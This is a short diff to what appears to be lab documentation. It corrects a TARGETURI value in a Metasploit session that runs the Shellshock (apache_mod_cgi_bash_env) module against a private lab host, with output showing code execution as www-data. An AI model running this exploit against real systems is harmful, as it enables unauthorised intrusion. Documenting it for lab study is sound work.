@@ -43,7 +43,7 @@ msf5 > use auxiliary/scanner/http/apache_mod_cgi_bash_env
 msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set RHOSTS 172.16.131.134
 RHOSTS => 172.16.131.134
 msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set TARGETURI /cgi-bin/test.sh
-TARGETURI => /cgi-bin/hw.sh
+TARGETURI => /cgi-bin/test.sh
 msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > exploit
 
 [+] uid=33(www-data) gid=33(www-data) groups=33(www-data)
